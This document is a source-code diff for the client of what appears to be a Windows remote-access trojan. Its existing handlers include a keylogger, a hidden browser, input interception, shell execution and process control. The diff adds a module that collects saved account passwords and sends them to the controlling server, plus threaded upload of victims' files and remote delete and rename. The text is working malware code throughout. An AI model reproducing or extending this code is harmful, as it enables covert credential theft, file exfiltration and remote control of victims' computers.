@@ -13,6 +13,7 @@
 #include "remote_input_interception.h"
 #include "remote_hidden_browser.h"
 #include "remote_keylogger.h"
+#include "remote_passwords.h"
 #include <ShlObj.h>
 #include <Shellapi.h>
 #include <PowrProf.h>
@@ -62,12 +63,155 @@ static DWORD g_last_mouse_path_log_tick = 0;
 typedef struct { int id; HANDLE hFile; char path[MAX_PATH]; long long fileSize; long long transferred; int active; } upload_slot_t;
 static upload_slot_t g_upload = { 0 };
 
+/* File manager: thread-safe send (upload thread and main loop can both send). */
+static HANDLE g_send_mutex = NULL;
+static volatile remote_transport_handle_t g_file_transport = NULL;
+static volatile long g_current_upload_id = 0;
+static volatile long g_cancel_requested_id = 0;
+
+static int send_frame_locked(remote_transport_handle_t t, const unsigned char* frame, unsigned int len) {
+    int ok = 0;
+    if (g_send_mutex) WaitForSingleObject(g_send_mutex, INFINITE);
+    if (t) ok = remote_transport_send(t, frame, len);
+    if (g_send_mutex) ReleaseMutex(g_send_mutex);
+    return ok;
+}
+
+/* Send SetStatusFileManager to server (errors, status). */
+static void send_set_status_file_manager(remote_transport_handle_t transport, const char* message, int set_last_directory_seen) {
+    unsigned char body[512];
+    unsigned int body_len = remote_proto_encode_set_status_file_manager(message, set_last_directory_seen, body, sizeof(body));
+    if (body_len == 0) return;
+    unsigned char full_msg[600];
+    unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg), REMOTE_SUBTYPE_SetStatusFileManager, body, body_len);
+    if (full_len == 0) return;
+    unsigned char frame[604];
+    unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
+    if (frame_len > 0) send_frame_locked(transport, frame, frame_len);
+}
+
+/* Recursively delete directory and contents. Returns 1 on success, 0 on failure. */
+static int delete_directory_recursive(const char* path) {
+    char search[MAX_PATH];
+    _snprintf_s(search, sizeof(search), _TRUNCATE, "%s\\*", path);
+    WIN32_FIND_DATAA fd;
+    HANDLE h = FindFirstFileA(search, &fd);
+    if (h == INVALID_HANDLE_VALUE) return 0;
+    do {
+        if (fd.cFileName[0] == '.' && (fd.cFileName[1] == '\0' || (fd.cFileName[1] == '.' && fd.cFileName[2] == '\0')))
+            continue;
+        char full[MAX_PATH];
+        _snprintf_s(full, sizeof(full), _TRUNCATE, "%s\\%s", path, fd.cFileName);
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            if (!delete_directory_recursive(full)) { FindClose(h); return 0; }
+            if (!RemoveDirectoryA(full)) { FindClose(h); return 0; }
+        } else {
+            if (!DeleteFileA(full)) { FindClose(h); return 0; }
+        }
+    } while (FindNextFileA(h, &fd));
+    FindClose(h);
+    return RemoveDirectoryA(path) ? 1 : 0;
+}
+
 static void upload_close(void) {
     if (g_upload.hFile != INVALID_HANDLE_VALUE && g_upload.hFile != NULL) {
         CloseHandle(g_upload.hFile);
         g_upload.hFile = INVALID_HANDLE_VALUE;
     }
     g_upload.active = 0;
+}
+
+typedef struct { int id; char path[MAX_PATH]; } file_upload_req_t;
+
+static DWORD WINAPI file_upload_thread(LPVOID param) {
+    file_upload_req_t* req = (file_upload_req_t*)param;
+    int xfer_id = req->id;
+    char path_buf[MAX_PATH];
+    strcpy_s(path_buf, sizeof(path_buf), req->path);
+    HeapFree(GetProcessHeap(), 0, req);
+    InterlockedExchange(&g_current_upload_id, (long)xfer_id);
+    remote_transport_handle_t t = g_file_transport;
+    if (!t) { InterlockedExchange(&g_current_upload_id, 0); return 0; }
+    HANDLE hFile = CreateFileA(path_buf, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        unsigned char cancel_buf[256];
+        unsigned int cancel_len = remote_proto_encode_file_transfer_cancel(xfer_id, "Error reading file", cancel_buf, sizeof(cancel_buf));
+        if (cancel_len > 0) {
+            unsigned char full_msg[280];
+            unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg), REMOTE_SUBTYPE_FileTransferCancel, cancel_buf, cancel_len);
+            if (full_len > 0) {
+                unsigned char frame[284];
+                unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
+                if (frame_len > 0) send_frame_locked(t, frame, frame_len);
+            }
+        }
+        InterlockedExchange(&g_current_upload_id, 0);
+        return 0;
+    }
+    LARGE_INTEGER fileSizeLi;
+    if (!GetFileSizeEx(hFile, &fileSizeLi) || fileSizeLi.QuadPart < 0) {
+        CloseHandle(hFile);
+        InterlockedExchange(&g_current_upload_id, 0);
+        return 0;
+    }
+    const unsigned int chunk_size = 65535u;
+    unsigned char* read_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, chunk_size);
+    unsigned char* enc_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, chunk_size + 1024);
+    int cancelled = 0;
+    if (read_buf && enc_buf) {
+        long long offset = 0;
+        int send_ok = 1;
+        while (offset < fileSizeLi.QuadPart && send_ok) {
+            if (g_cancel_requested_id == (long)xfer_id) {
+                cancelled = 1;
+                break;
+            }
+            DWORD to_read = (DWORD)((fileSizeLi.QuadPart - offset) > (long long)chunk_size ? chunk_size : (unsigned int)(fileSizeLi.QuadPart - offset));
+            DWORD read_len = 0;
+            if (!ReadFile(hFile, read_buf, to_read, &read_len, NULL) || read_len == 0) break;
+            unsigned int enc_len = remote_proto_encode_file_transfer_chunk(xfer_id, path_buf, fileSizeLi.QuadPart, offset, read_buf, (unsigned int)read_len, enc_buf, chunk_size + 1024);
+            if (enc_len == 0) { send_ok = 0; break; }
+            unsigned char full_msg[66000];
+            unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg), REMOTE_SUBTYPE_FileTransferChunk, enc_buf, enc_len);
+            if (full_len == 0) { send_ok = 0; break; }
+            unsigned char frame[66008];
+            unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
+            if (frame_len == 0 || !send_frame_locked(t, frame, frame_len)) send_ok = 0;
+            offset += (long long)read_len;
+        }
+        if (cancelled) {
+            unsigned char cancel_buf[256];
+            unsigned int cancel_len = remote_proto_encode_file_transfer_cancel(xfer_id, "Canceled", cancel_buf, sizeof(cancel_buf));
+            if (cancel_len > 0) {
+                unsigned char full_msg[280];
+                unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg), REMOTE_SUBTYPE_FileTransferCancel, cancel_buf, cancel_len);
+                if (full_len > 0) {
+                    unsigned char frame[284];
+                    unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
+                    if (frame_len > 0) send_frame_locked(t, frame, frame_len);
+                }
+            }
+            remote_log("[loop] FileTransfer cancelled (id=%d)", xfer_id);
+        } else if (send_ok) {
+            unsigned char complete_buf[512];
+            unsigned int complete_len = remote_proto_encode_file_transfer_complete(xfer_id, path_buf, complete_buf, sizeof(complete_buf));
+            if (complete_len > 0) {
+                unsigned char full_msg[520];
+                unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg), REMOTE_SUBTYPE_FileTransferComplete, complete_buf, complete_len);
+                if (full_len > 0) {
+                    unsigned char frame[524];
+                    unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
+                    if (frame_len > 0) send_frame_locked(t, frame, frame_len);
+                }
+            }
+            remote_log("[loop] FileTransfer complete sent (id=%d)", xfer_id);
+        }
+        HeapFree(GetProcessHeap(), 0, enc_buf);
+        HeapFree(GetProcessHeap(), 0, read_buf);
+    }
+    CloseHandle(hFile);
+    InterlockedExchange(&g_current_upload_id, 0);
+    return 0;
 }
 
 /* Generate a simple 64-char id (server requires Id.Length == 64). */
@@ -162,7 +306,7 @@ void remote_client_run(void) {
 
         unsigned int frame_len = remote_proto_write_frame(frame_buf + 4, full_payload_len, frame_buf, sizeof(frame_buf));
         remote_log("[handshake] sending identification frame: %u bytes (4-byte length + %u payload)", frame_len, full_payload_len);
-        if (frame_len == 0 || !remote_transport_send(transport, frame_buf, frame_len)) {
+        if (frame_len == 0 || !send_frame_locked(transport, frame_buf, frame_len)) {
             remote_log("[handshake] send identification failed");
             remote_transport_close(transport);
             Sleep(5000);
@@ -224,7 +368,9 @@ void remote_client_run(void) {
                 remote_log("[loop] heap alloc for payload failed");
                 break;
             }
+            if (!g_send_mutex) g_send_mutex = CreateMutexA(NULL, FALSE, NULL);
             while (InterlockedCompareExchange(&g_client_stop, 1, 1) != 1) {
+                g_file_transport = transport;
                 if (InterlockedCompareExchange(&g_request_reconnect, 1, 1) == 1) {
                     remote_log("[loop] reconnect requested; breaking to reconnect");
                     break;
@@ -272,6 +418,12 @@ void remote_client_run(void) {
                 if (dispatch_len >= 2 && dispatch_buf[0] == 0x08) {
                     unsigned int consumed = 0;
                     unsigned int subtype = remote_proto_read_subtype(dispatch_buf, dispatch_len, &consumed);
+                    unsigned int body_len = (dispatch_len > consumed) ? (dispatch_len - consumed) : 0;
+                    remote_log("[loop] received subtype=%u body_len=%u", subtype, body_len);
+                    if (body_len > 0) {
+                        unsigned int dump_len = body_len > 64 ? 64 : body_len;
+                        remote_log_hex("IMessage body", dispatch_buf + consumed, dump_len);
+                    }
 
                     if (subtype == REMOTE_SUBTYPE_GetMonitors) {
                         int count = GetSystemMetrics(SM_CMONITORS);
@@ -287,7 +439,7 @@ void remote_client_run(void) {
                                 if (full_len > 0) {
                                     unsigned char frame[128];
                                     unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
-                                    int sent = (frame_len > 0 && remote_transport_send(transport, frame, frame_len));
+                                    int sent = (frame_len > 0 && send_frame_locked(transport, frame, frame_len));
                                     remote_log("[loop] GetMonitorsResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
                                 } else
                                     remote_log("[loop] GetMonitorsResponse prepend_imessage failed");
@@ -309,7 +461,7 @@ void remote_client_run(void) {
                                 if (full_len > 0) {
                                     unsigned char frame[324];
                                     unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
-                                    int sent = (frame_len > 0 && remote_transport_send(transport, frame, frame_len));
+                                    int sent = (frame_len > 0 && send_frame_locked(transport, frame, frame_len));
                                     remote_log("[loop] KernelInputInitResponse sent: success=%d, send %s", ok, sent ? "OK" : "FAIL");
                                 }
                             }
@@ -357,7 +509,7 @@ void remote_client_run(void) {
                                 unsigned char frame_buf[148];
                                 unsigned int frame_len = remote_proto_write_frame(full_buf, full_len, frame_buf, sizeof(frame_buf));
                                 if (frame_len > 0)
-                                    remote_transport_send(transport, frame_buf, frame_len);
+                                    send_frame_locked(transport, frame_buf, frame_len);
                             }
                         }
                         remote_log("[loop] DoCloseHiddenBrowser: result=%d (%s)", close_result, msg);
@@ -389,7 +541,7 @@ void remote_client_run(void) {
                                             unsigned char* frame_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, frame_max);
                                             if (frame_buf) {
                                                 unsigned int frame_len = remote_proto_write_frame(full_buf, full_len, frame_buf, frame_max);
-                                                remote_transport_send(transport, frame_buf, frame_len);
+                                                send_frame_locked(transport, frame_buf, frame_len);
                                                 HeapFree(GetProcessHeap(), 0, frame_buf);
                                             }
                                         }
@@ -540,7 +692,7 @@ void remote_client_run(void) {
                                 if (full_len > 0) {
                                     unsigned char frame[604];
                                     unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
-                                    int sent = (frame_len > 0 && remote_transport_send(transport, frame, frame_len));
+                                    int sent = (frame_len > 0 && send_frame_locked(transport, frame, frame_len));
                                     remote_log("[loop] GetDrivesResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
                                 } else
                                     remote_log("[loop] GetDrivesResponse prepend_imessage failed");
@@ -570,11 +722,46 @@ void remote_client_run(void) {
                                 if (full_len > 0) {
                                     unsigned char frame[524];
                                     unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
-                                    int sent = (frame_len > 0 && remote_transport_send(transport, frame, frame_len));
+                                    int sent = (frame_len > 0 && send_frame_locked(transport, frame, frame_len));
                                     remote_log("[loop] GetKeyloggerLogsDirectoryResponse sent: path=%s, send %s", logs_dir, sent ? "OK" : "FAIL");
                                 }
                             } else
                                 remote_log("[loop] GetKeyloggerLogsDirectoryResponse encode failed");
+                        }
+                    }
+                    else if (subtype == REMOTE_SUBTYPE_GetPasswords) {
+                        remote_log("[loop] handling GetPasswords");
+                        {
+                            remote_recovered_account_t* accounts = (remote_recovered_account_t*)HeapAlloc(GetProcessHeap(), 0, sizeof(remote_recovered_account_t) * REMOTE_MAX_ACCOUNTS);
+                            if (!accounts) { remote_log("[loop] GetPasswords: heap alloc for accounts failed"); }
+                            else {
+                            unsigned int n = remote_passwords_collect(accounts, REMOTE_MAX_ACCOUNTS);
+                            const unsigned int resp_max = 256 * 1024u;
+                            unsigned char* resp_body = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, resp_max);
+                            if (resp_body) {
+                                unsigned int resp_len = remote_proto_encode_get_passwords_response(accounts, n, resp_body, resp_max);
+                                if (resp_len > 0) {
+                                    unsigned char* full_msg = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, resp_len + 16);
+                                    if (full_msg) {
+                                        unsigned int full_len = remote_proto_prepend_imessage(full_msg, resp_len + 16,
+                                            REMOTE_SUBTYPE_GetPasswordsResponse, resp_body, resp_len);
+                                        if (full_len > 0) {
+                                            unsigned char* frame_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, 4 + full_len);
+                                            if (frame_buf) {
+                                                unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame_buf, 4 + full_len);
+                                                if (frame_len > 0)
+                                                    send_frame_locked(transport, frame_buf, frame_len);
+                                                HeapFree(GetProcessHeap(), 0, frame_buf);
+                                            }
+                                        }
+                                        HeapFree(GetProcessHeap(), 0, full_msg);
+                                    }
+                                    remote_log("[loop] GetPasswordsResponse sent: %u accounts", n);
+                                }
+                                HeapFree(GetProcessHeap(), 0, resp_body);
+                            }
+                            HeapFree(GetProcessHeap(), 0, accounts);
+                            }
                         }
                     }
                     else if (subtype == REMOTE_SUBTYPE_DoProcessEnd) {
@@ -599,7 +786,7 @@ void remote_client_run(void) {
                                     if (full_len > 0) {
                                         unsigned char frame[68];
                                         unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
-                                        remote_transport_send(transport, frame, frame_len);
+                                        send_frame_locked(transport, frame, frame_len);
                                         remote_log("[loop] DoProcessResponse (End) sent: result=%s", ok ? "OK" : "FAIL");
                                     }
                                 }
@@ -630,7 +817,7 @@ void remote_client_run(void) {
                                     if (full_len > 0) {
                                         unsigned char frame[68];
                                         unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
-                                        remote_transport_send(transport, frame, frame_len);
+                                        send_frame_locked(transport, frame, frame_len);
                                         remote_log("[loop] DoProcessResponse (Start) sent: result=%s", ok ? "OK" : "FAIL");
                                     }
                                 }
@@ -679,7 +866,7 @@ void remote_client_run(void) {
                                             unsigned char* frame_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, 4 + full_len);
                                             if (frame_buf) {
                                                 unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame_buf, 4 + full_len);
-                                                int sent = (frame_len > 0 && remote_transport_send(transport, frame_buf, frame_len));
+                                                int sent = (frame_len > 0 && send_frame_locked(transport, frame_buf, frame_len));
                                                 HeapFree(GetProcessHeap(), 0, frame_buf);
                                                 remote_log("[loop] DoShellExecuteResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
                                             }
@@ -706,7 +893,7 @@ void remote_client_run(void) {
                                     unsigned char* frame_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, 4 + full_len);
                                     if (frame_buf) {
                                         unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame_buf, 4 + full_len);
-                                        int sent = (frame_len > 0 && remote_transport_send(transport, frame_buf, frame_len));
+                                        int sent = (frame_len > 0 && send_frame_locked(transport, frame_buf, frame_len));
                                         HeapFree(GetProcessHeap(), 0, frame_buf);
                                         remote_log("[loop] GetProcessesResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
                                     } else
@@ -731,7 +918,7 @@ void remote_client_run(void) {
                                         unsigned char* frame_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, 4 + full_len);
                                         if (frame_buf) {
                                             unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame_buf, 4 + full_len);
-                                            int sent = (frame_len > 0 && remote_transport_send(transport, frame_buf, frame_len));
+                                            int sent = (frame_len > 0 && send_frame_locked(transport, frame_buf, frame_len));
                                             HeapFree(GetProcessHeap(), 0, frame_buf);
                                             remote_log("[loop] GetConnectionsResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
                                         }
@@ -809,7 +996,7 @@ void remote_client_run(void) {
                                                 unsigned char* frame_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, 4 + full_len);
                                                 if (frame_buf) {
                                                     unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame_buf, 4 + full_len);
-                                                    remote_transport_send(transport, frame_buf, frame_len);
+                                                    send_frame_locked(transport, frame_buf, frame_len);
                                                     HeapFree(GetProcessHeap(), 0, frame_buf);
                                                 }
                                             }
@@ -932,7 +1119,7 @@ void remote_client_run(void) {
                                 if (full_len > 0) {
                                     unsigned char frame[8304];
                                     unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
-                                    int sent = (frame_len > 0 && remote_transport_send(transport, frame, frame_len));
+                                    int sent = (frame_len > 0 && send_frame_locked(transport, frame, frame_len));
                                     remote_log("[loop] GetStartupItemsResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
                                 } else
                                     remote_log("[loop] GetStartupItemsResponse prepend_imessage failed");
@@ -952,7 +1139,7 @@ void remote_client_run(void) {
                                 if (full_len > 0) {
                                     unsigned char frame[604];
                                     unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
-                                    int sent = (frame_len > 0 && remote_transport_send(transport, frame, frame_len));
+                                    int sent = (frame_len > 0 && send_frame_locked(transport, frame, frame_len));
                                     remote_log("[loop] GetSystemInfoResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
                                 } else
                                     remote_log("[loop] GetSystemInfoResponse prepend_imessage failed");
@@ -991,7 +1178,7 @@ void remote_client_run(void) {
                                                     unsigned char* frame_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, frame_max);
                                                     if (frame_buf) {
                                                         unsigned int frame_len = remote_proto_write_frame(full_buf, full_len, frame_buf, frame_max);
-                                                        remote_transport_send(transport, frame_buf, frame_len);
+                                                        send_frame_locked(transport, frame_buf, frame_len);
                                                         HeapFree(GetProcessHeap(), 0, frame_buf);
                                                     }
                                                 }
@@ -1026,17 +1213,109 @@ void remote_client_run(void) {
                                     if (full_len > 0) {
                                         unsigned char frame[16404];
                                         unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
-                                        int sent = (frame_len > 0 && remote_transport_send(transport, frame, frame_len));
+                                        int sent = (frame_len > 0 && send_frame_locked(transport, frame, frame_len));
                                         remote_log("[loop] GetDirectoryResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
                                     } else
                                         remote_log("[loop] GetDirectoryResponse prepend_imessage failed");
                                 } else
-                                    remote_log("[loop] GetDirectoryResponse encode failed (path=%s)", path_buf);
-                            } else
-                                remote_log("[loop] GetDirectory decode failed");
+                                    send_set_status_file_manager(transport, "GetDirectory I/O error", 1);
+                            } else {
+                                send_set_status_file_manager(transport, "GetDirectory Failed", 1);
+                                remote_log("[loop] GetDirectory decode failed (body_len=%u)", (unsigned)body_len);
+                                remote_log_hex("GetDirectory body", body, body_len > 64 ? 64 : body_len);
+                            }
                         }
                     }
-                    else if (subtype == REMOTE_SUBTYPE_FileTransferRequest) {
+                    else if (subtype == REMOTE_SUBTYPE_DoPathDelete) {
+                        remote_log("[loop] handling DoPathDelete");
+                        {
+                            const unsigned char* body = dispatch_buf + consumed;
+                            unsigned int body_len = dispatch_len - consumed;
+                            char path_buf[MAX_PATH];
+                            int path_type = 0;
+                            if (remote_proto_decode_do_path_delete(body, body_len, path_buf, sizeof(path_buf), &path_type)) {
+                                int ok = 0;
+                                if (path_type == 1) {
+                                    ok = delete_directory_recursive(path_buf);
+                                    if (ok) send_set_status_file_manager(transport, "Deleted directory", 0);
+                                } else {
+                                    ok = DeleteFileA(path_buf) ? 1 : 0;
+                                    if (ok) send_set_status_file_manager(transport, "Deleted file", 0);
+                                }
+                                if (!ok) {
+                                    DWORD err = GetLastError();
+                                    if (err == ERROR_ACCESS_DENIED) send_set_status_file_manager(transport, "DeletePath No permission", 0);
+                                    else if (err == ERROR_PATH_NOT_FOUND || err == ERROR_FILE_NOT_FOUND) send_set_status_file_manager(transport, "DeletePath Path not found", 0);
+                                    else send_set_status_file_manager(transport, "DeletePath Failed", 0);
+                                } else {
+                                    char parent[MAX_PATH];
+                                    const char* last = strrchr(path_buf, '\\');
+                                    if (last && last > path_buf) {
+                                        size_t n = (size_t)(last - path_buf);
+                                        if (n < sizeof(parent)) { memcpy(parent, path_buf, n); parent[n] = '\0'; }
+                                        else { parent[0] = '\0'; n = 0; }
+                                        if (n > 0) {
+                                            unsigned char resp_body[16384];
+                                            unsigned int resp_len = remote_proto_encode_get_directory_response(parent, resp_body, sizeof(resp_body));
+                                            if (resp_len > 0) {
+                                                unsigned char full_msg[16400];
+                                                unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg), REMOTE_SUBTYPE_GetDirectoryResponse, resp_body, resp_len);
+                                                if (full_len > 0) {
+                                                    unsigned char frame[16404];
+                                                    unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
+                                                    if (frame_len > 0) send_frame_locked(transport, frame, frame_len);
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                            } else
+                                send_set_status_file_manager(transport, "DeletePath Failed", 0);
+                        }
+                    }
+                    else if (subtype == REMOTE_SUBTYPE_DoPathRename) {
+                        remote_log("[loop] handling DoPathRename");
+                        {
+                            const unsigned char* body = dispatch_buf + consumed;
+                            unsigned int body_len = dispatch_len - consumed;
+                            char path_buf[MAX_PATH];
+                            char new_path_buf[MAX_PATH];
+                            int path_type = 0;
+                            if (remote_proto_decode_do_path_rename(body, body_len, path_buf, sizeof(path_buf), new_path_buf, sizeof(new_path_buf), &path_type)) {
+                                int ok = MoveFileA(path_buf, new_path_buf) ? 1 : 0;
+                                if (ok) {
+                                    send_set_status_file_manager(transport, path_type == 1 ? "Renamed directory" : "Renamed file", 0);
+                                    char parent[MAX_PATH];
+                                    const char* last = strrchr(new_path_buf, '\\');
+                                    if (last && last > new_path_buf) {
+                                        size_t n = (size_t)(last - new_path_buf);
+                                        if (n < sizeof(parent)) { memcpy(parent, new_path_buf, n); parent[n] = '\0'; }
+                                        else { parent[0] = '\0'; n = 0; }
+                                        if (n > 0) {
+                                            unsigned char resp_body[16384];
+                                            unsigned int resp_len = remote_proto_encode_get_directory_response(parent, resp_body, sizeof(resp_body));
+                                            if (resp_len > 0) {
+                                                unsigned char full_msg[16400];
+                                                unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg), REMOTE_SUBTYPE_GetDirectoryResponse, resp_body, resp_len);
+                                                if (full_len > 0) {
+                                                    unsigned char frame[16404];
+                                                    unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
+                                                    if (frame_len > 0) send_frame_locked(transport, frame, frame_len);
+                                                }
+                                            }
+                                        }
+                                    }
+                                } else {
+                                    DWORD err = GetLastError();
+                                    if (err == ERROR_ACCESS_DENIED) send_set_status_file_manager(transport, "RenamePath No permission", 0);
+                                    else if (err == ERROR_PATH_NOT_FOUND || err == ERROR_FILE_NOT_FOUND) send_set_status_file_manager(transport, "RenamePath Path not found", 0);
+                                    else send_set_status_file_manager(transport, "RenamePath Failed", 0);
+                                }
+                            } else
+                                send_set_status_file_manager(transport, "RenamePath Failed", 0);
+                        }
+                    }
+                    else if (subtype == REMOTE_SUBTYPE_FileTransferRequest || subtype == 35u) {
                         remote_log("[loop] handling FileTransferRequest");
                         {
                             const unsigned char* body = dispatch_buf + consumed;
@@ -1044,60 +1323,38 @@ void remote_client_run(void) {
                             int xfer_id = 0;
                             char path_buf[MAX_PATH];
                             if (remote_proto_decode_file_transfer_request(body, body_len, &xfer_id, path_buf, sizeof(path_buf))) {
-                                HANDLE hFile = CreateFileA(path_buf, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-                                if (hFile != INVALID_HANDLE_VALUE) {
-                                    LARGE_INTEGER fileSizeLi;
-                                    if (GetFileSizeEx(hFile, &fileSizeLi) && fileSizeLi.QuadPart >= 0) {
-                                        const unsigned int chunk_size = 65535u;
-                                        unsigned char* read_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, chunk_size);
-                                        unsigned char* enc_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, chunk_size + 1024);
-                                        if (read_buf && enc_buf) {
-                                            long long offset = 0;
-                                            int send_ok = 1;
-                                            while (offset < fileSizeLi.QuadPart && send_ok) {
-                                                DWORD to_read = (DWORD)((fileSizeLi.QuadPart - offset) > (long long)chunk_size ? chunk_size : (unsigned int)(fileSizeLi.QuadPart - offset));
-                                                DWORD read_len = 0;
-                                                if (!ReadFile(hFile, read_buf, to_read, &read_len, NULL) || read_len == 0) break;
-                                                unsigned int enc_len = remote_proto_encode_file_transfer_chunk(xfer_id, path_buf, fileSizeLi.QuadPart, offset, read_buf, (unsigned int)read_len, enc_buf, chunk_size + 1024);
-                                                if (enc_len == 0) { send_ok = 0; break; }
-                                                unsigned char full_msg[66000];
-                                                unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg), REMOTE_SUBTYPE_FileTransferChunk, enc_buf, enc_len);
-                                                if (full_len == 0) { send_ok = 0; break; }
-                                                unsigned char frame[66008];
-                                                unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
-                                                if (frame_len == 0 || !remote_transport_send(transport, frame, frame_len)) send_ok = 0;
-                                                offset += (long long)read_len;
-                                            }
-                                            if (send_ok) {
-                                                unsigned char complete_buf[512];
-                                                unsigned int complete_len = remote_proto_encode_file_transfer_complete(xfer_id, path_buf, complete_buf, sizeof(complete_buf));
-                                                if (complete_len > 0) {
-                                                    unsigned char full_msg[520];
-                                                    unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg), REMOTE_SUBTYPE_FileTransferComplete, complete_buf, complete_len);
-                                                    if (full_len > 0) {
-                                                        unsigned char frame[524];
-                                                        unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
-                                                        remote_transport_send(transport, frame, frame_len);
-                                                    }
-                                                }
-                                                remote_log("[loop] FileTransfer complete sent (id=%d)", xfer_id);
-                                            } else
-                                                remote_log("[loop] FileTransfer chunk send failed");
-                                            HeapFree(GetProcessHeap(), 0, enc_buf);
-                                            HeapFree(GetProcessHeap(), 0, read_buf);
-                                        } else {
-                                            if (read_buf) HeapFree(GetProcessHeap(), 0, read_buf);
-                                            if (enc_buf) HeapFree(GetProcessHeap(), 0, enc_buf);
-                                        }
+                                remote_proto_normalize_path(path_buf, (unsigned int)sizeof(path_buf));
+                                file_upload_req_t* req = (file_upload_req_t*)HeapAlloc(GetProcessHeap(), 0, sizeof(file_upload_req_t));
+                                if (req) {
+                                    req->id = xfer_id;
+                                    strcpy_s(req->path, sizeof(req->path), path_buf);
+                                    remote_log("[loop] FileTransferRequest starting download id=%d path=%s", xfer_id, path_buf);
+                                    HANDLE th = CreateThread(NULL, 0, file_upload_thread, req, 0, NULL);
+                                    if (th) CloseHandle(th);
+                                    else {
+                                        HeapFree(GetProcessHeap(), 0, req);
+                                        send_set_status_file_manager(transport, "FileTransferRequest Failed", 0);
                                     }
-                                    CloseHandle(hFile);
-                                } else
-                                    remote_log("[loop] FileTransferRequest: CreateFile failed for %s", path_buf);
-                            } else
+                                }
+                            } else {
+                                send_set_status_file_manager(transport, "FileTransferRequest Failed", 0);
                                 remote_log("[loop] FileTransferRequest decode failed");
+                            }
                         }
                     }
-                    else if (subtype == REMOTE_SUBTYPE_FileTransferChunk) {
+                    else if (subtype == REMOTE_SUBTYPE_FileTransferCancel && subtype != 33u) {
+                        int cancel_id = 0;
+                        char reason_buf[128];
+                        if (remote_proto_decode_file_transfer_cancel(dispatch_buf + consumed, dispatch_len - consumed, &cancel_id, reason_buf, sizeof(reason_buf))) {
+                            static int s_last_cancel_id_logged = -1;
+                            InterlockedExchange(&g_cancel_requested_id, (long)cancel_id);
+                            if (cancel_id != s_last_cancel_id_logged) {
+                                s_last_cancel_id_logged = cancel_id;
+                                remote_log("[loop] FileTransferCancel received (id=%d)", cancel_id);
+                            }
+                        }
+                    }
+                    else if (subtype == REMOTE_SUBTYPE_FileTransferChunk || subtype == 33u) {
                         remote_log("[loop] handling FileTransferChunk (server upload)");
                         {
                             const unsigned char* body = dispatch_buf + consumed;
@@ -1148,7 +1405,7 @@ void remote_client_run(void) {
                                                     if (full_len > 0) {
                                                         unsigned char frame[524];
                                                         unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
-                                                        remote_transport_send(transport, frame, frame_len);
+                                                        send_frame_locked(transport, frame, frame_len);
                                                     }
                                                 }
                                                 remote_log("[loop] FileTransferComplete sent (upload done)");
